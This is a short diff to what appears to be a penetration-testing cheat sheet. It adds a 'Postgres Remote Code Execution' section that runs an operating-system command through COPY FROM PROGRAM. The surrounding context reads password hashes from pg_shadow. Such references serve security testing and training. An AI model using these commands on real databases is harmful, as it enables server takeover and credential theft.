@@ -2229,7 +2229,7 @@ psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>
 psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>
 ```
 
-### Common Commands
+##### Common Commands
 
 ```c
 postgres=# \list                     // list all databases
@@ -2246,6 +2246,16 @@ postgres=# \q                        // quit
 <DATABASE>=# SELECT * FROM users;    // select everything from users table
 <DATABASE>=# SHOW rds.extensions;    // list installed extensions
 <DATABASE>=# SELECT usename, passwd from pg_shadow;    // read credentials
+```
+
+##### Postgres Remote Code Execution
+
+```c
+<DATABASE>=# DROP TABLE IF EXISTS cmd_exec;
+<DATABASE>=# CREATE TABLE cmd_exec(cmd_output text);
+<DATABASE>=# COPY cmd_exec FROM PROGRAM 'id';
+<DATABASE>=# SELECT * FROM cmd_exec;
+<DATABASE>=# DROP TABLE IF EXISTS cmd_exec;
 ```
 
 #### Redis
